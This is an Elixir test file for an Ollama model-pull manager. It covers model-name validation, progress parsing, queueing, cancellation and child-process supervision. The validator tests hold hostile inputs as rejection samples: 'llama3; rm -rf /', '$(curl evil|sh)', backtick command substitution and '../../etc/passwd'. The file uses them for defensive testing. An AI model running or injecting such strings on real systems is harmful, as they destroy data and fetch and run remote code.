defmodule Glorbo.Ollama.PullTest do
  # async: false — the GenServer-flow tests share the global "ollama:pulls"
  # PubSub topic; serialising avoids cross-talk between concurrent pulls.
  use ExUnit.Case, async: false

  alias Glorbo.Ollama.Pull

  describe "validate_model/1 (D10)" do
    test "accepts real Ollama model refs" do
      for m <- [
            "mistral",
            "llama3.1:8b",
            "qwen2.5:14b-q4_k_m",
            "library/llama3",
            "registry.ollama.ai/library/llama3:latest"
          ] do
        assert Pull.validate_model(m) == :ok, "expected #{m} to be valid"
      end
    end

    test "rejects shell metacharacters, flags, traversal, whitespace, junk" do
      for m <- [
            "llama3; rm -rf /",
            "$(curl evil|sh)",
            "`id`",
            "--insecure",
            "-x",
            "../../etc/passwd",
            "a..b",
            "model name",
            "model\nname",
            "UPPER",
            "",
            String.duplicate("a", 201)
          ] do
        assert Pull.validate_model(m) == {:error, :invalid_model},
               "expected #{inspect(m)} to be rejected"
      end
    end

    test "rejects non-binaries" do
      assert Pull.validate_model(nil) == {:error, :invalid_model}
      assert Pull.validate_model(:atom) == {:error, :invalid_model}
    end

    test "rejects leading/trailing newlines (\\A/\\z anchors, not ^/$)" do
      # `$` matches before a trailing newline, so the old `^…$` regex
      # accepted "llama3\n". `\A…\z` rejects it.
      for m <- ["llama3\n", "llama3:latest\n", "\nllama3", "mistral\r\n"] do
        assert Pull.validate_model(m) == {:error, :invalid_model},
               "expected #{inspect(m)} to be rejected"
      end
    end
  end

  describe "parse_percent/1" do
    test "extracts the percent from an ollama progress line" do
      assert Pull.parse_percent("pulling abc123...  42% ▕██▏ 2.0 GB/4.7 GB") == 42
      assert Pull.parse_percent("downloading 100% done") == 100
    end

    test "nil for non-progress lines, and caps at 100" do
      assert Pull.parse_percent("pulling manifest") == nil
      assert Pull.parse_percent("verifying sha256 digest") == nil
      assert Pull.parse_percent("999% bogus") == 100
    end
  end

  describe "pull flow" do
    setup do
      Phoenix.PubSub.subscribe(Glorbo.PubSub, Pull.topic())
      :ok
    end

    defp controllable_child, do: spawn(fn -> receive do: ({:exit, r} -> exit(r)) end)

    defp start_pull_server(opts) do
      {:ok, pid} = start_supervised({Pull, Keyword.put(opts, :name, nil)})
      pid
    end

    test "an invalid model is rejected before any spawn" do
      parent = self()

      spawn_fun = fn _m, _l ->
        send(parent, :spawned)
        {:ok, controllable_child()}
      end

      p = start_pull_server(spawn_fun: spawn_fun)

      assert {:error, :invalid_model} = Pull.pull(p, "evil; rm -rf /")
      refute_received :spawned
    end

    test "pull emits :started, streams :progress, then :done; advances the queue" do
      parent = self()

      spawn_fun = fn model, logger_fun ->
        child = controllable_child()
        send(parent, {:child, model, child, logger_fun})
        {:ok, child}
      end

      p = start_pull_server(spawn_fun: spawn_fun)

      assert :ok = Pull.pull(p, "llama3:8b")
      assert :ok = Pull.pull(p, "mistral")
      # second pull is queued behind the first
      assert %{current: "llama3:8b", queue: ["mistral"]} = Pull.state(p)

      assert_receive {:ollama_pull, {:started, "llama3:8b"}}
      assert_receive {:child, "llama3:8b", child1, logger1}

      # simulate ollama streaming output
      logger1.("pulling manifest")
      logger1.("downloading  37% ▕██▏")
      assert_receive {:ollama_pull, {:progress, "llama3:8b", 37}}

      # finish the first pull → :done + the queued one starts
      send(child1, {:exit, :normal})
      assert_receive {:ollama_pull, {:done, "llama3:8b"}}
      assert_receive {:ollama_pull, {:started, "mistral"}}
      assert %{current: "mistral", queue: []} = Pull.state(p)
    end

    test "a non-normal child exit reports :error" do
      parent = self()

      spawn_fun = fn _m, _l ->
        child = controllable_child()
        send(parent, {:child, child})
        {:ok, child}
      end

      p = start_pull_server(spawn_fun: spawn_fun)

      Pull.pull(p, "badmodel")
      assert_receive {:ollama_pull, {:started, "badmodel"}}
      assert_receive {:child, child}
      send(child, {:exit, :some_failure})
      assert_receive {:ollama_pull, {:error, "badmodel", :some_failure}}
    end

    test "cancel of the in-flight pull kills the child + advances the queue" do
      parent = self()

      spawn_fun = fn model, _l ->
        child = controllable_child()
        send(parent, {:child, model, child})
        {:ok, child}
      end

      p =
        start_pull_server(
          spawn_fun: spawn_fun,
          stop_fun: fn pid ->
            Process.exit(pid, :kill)
            :ok
          end
        )

      Pull.pull(p, "first")
      Pull.pull(p, "second")
      assert_receive {:child, "first", child1}

      assert :ok = Pull.cancel(p, "first")
      assert_receive {:ollama_pull, {:cancelled, "first"}}
      # the cancelled child's later DOWN must NOT be reported (demonitored)
      assert_receive {:ollama_pull, {:started, "second"}}
      refute Process.alive?(child1)
    end

    test "an abnormal exit of a LINKED child does not crash the manager" do
      # MuonTrap.Daemon.start_link LINKS the child to the manager; mimic
      # that with spawn_link. Without the unlink guard the child's :boom
      # exit would propagate over the link and kill the Pull manager
      # before its monitor handler could report {:error, ...}.
      parent = self()

      spawn_fun = fn model, _l ->
        child = spawn_link(fn -> receive do: ({:exit, r} -> exit(r)) end)
        send(parent, {:child, model, child})
        {:ok, child}
      end

      p = start_pull_server(spawn_fun: spawn_fun)
      mref = Process.monitor(p)

      Pull.pull(p, "first")
      Pull.pull(p, "second")
      assert_receive {:child, "first", child1}
      assert_receive {:ollama_pull, {:started, "first"}}

      send(child1, {:exit, :boom})

      # Manager survived: it reported the error AND advanced the queue.
      assert_receive {:ollama_pull, {:error, "first", :boom}}
      assert_receive {:ollama_pull, {:started, "second"}}
      assert Process.alive?(p)
      refute_receive {:DOWN, ^mref, :process, ^p, _}, 50
    end

    test "the in-flight child is torn down when the manager stops (kept link)" do
      # The manager keeps the MuonTrap link (it traps exits rather than
      # unlinking), so stopping/crashing the manager tears the in-flight
      # `ollama pull` child down instead of orphaning it.
      # Trap exits here so the manager's :shutdown (it's linked to us via
      # start_link) is a harmless message, not a kill of the test.
      Process.flag(:trap_exit, true)
      parent = self()

      spawn_fun = fn model, _l ->
        child = spawn_link(fn -> receive do: ({:exit, r} -> exit(r)) end)
        send(parent, {:child, model, child})
        {:ok, child}
      end

      {:ok, p} = Pull.start_link(name: nil, spawn_fun: spawn_fun)
      Pull.pull(p, "first")
      assert_receive {:child, "first", child}
      cref = Process.monitor(child)

      GenServer.stop(p, :shutdown)
      assert_receive {:DOWN, ^cref, :process, ^child, _}
    end

    test "cancel of a queued (not-yet-running) pull just drops it" do
      parent = self()

      spawn_fun = fn model, _l ->
        child = controllable_child()
        send(parent, {:child, model, child})
        {:ok, child}
      end

      p = start_pull_server(spawn_fun: spawn_fun)
      Pull.pull(p, "running")
      Pull.pull(p, "waiting")
      assert %{current: "running", queue: ["waiting"]} = Pull.state(p)

      assert :ok = Pull.cancel(p, "waiting")
      assert %{current: "running", queue: []} = Pull.state(p)
    end
  end
end
